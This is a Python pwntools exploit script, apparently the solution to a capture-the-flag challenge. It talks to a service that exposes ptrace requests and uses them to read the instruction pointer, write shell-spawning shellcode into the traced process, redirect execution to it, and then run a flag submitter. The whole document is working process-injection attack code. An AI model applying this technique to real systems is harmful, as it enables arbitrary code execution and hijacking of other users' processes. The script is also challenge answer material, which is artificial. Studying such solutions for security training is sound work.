#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, PORT)

# Ptrace request IDs:
# 0: PTRACE_TRACEME
# 1: PTRACE_PEEKTEXT
# 2: PTRACE_PEEKDATA
# 3: PTRACE_PEEKUSER
# 4: PTRACE_POKETEXT
# 5: PTRACE_POKEDATA
# 6: PTRACE_POKEUSER
# 7: PTRACE_CONT
# 8: PTRACE_KILL
# 9: PTRACE_SINGLESTEP


def sendReq(num, addr, data):
    global io
    io.recvuntil(b"What ptrace request do you want to send?")
    io.sendline(hex(num).encode())
    io.recvuntil(b"What address do you want?")
    io.sendline(hex(addr).encode())
    io.recvuntil(b"data?")
    io.sendline(hex(data).encode())
    io.recvuntil(b"ptrace returned ")
    r = io.recvline()
    return int(r,16)

# x86 ptrace detach: 0x11

context.arch="amd64"
shellcode = asm(shellcraft.sh())

rip = sendReq(3, 8 * 16, 0)
print("RIP: " + hex(rip))
io.sendlineafter(b"Do another (0/1)?", b"1")

for i in range(0, len(shellcode), 8):
    sendReq(4, rip + 15 + i, u64(shellcode[i:i+8].ljust(8, b"\x90")))
    io.sendlineafter(b"Do another (0/1)?", b"1")

sendReq(6, 8* 16, rip+15)
io.sendlineafter(b"Do another (0/1)?", b"1")

sendReq(7, 0, 18)
io.sendlineafter(b"Do another (0/1)?", b"1")

for i in range(20):
    print(i, hex(sendReq(3, i*8, 0)))
    io.sendlineafter(b"Do another (0/1)?", b"1")

sendReq(7, 0, 18)
io.sendlineafter(b"Do another (0/1)?", b"0")

io.sendline("./submitter")

print(io.recvall())
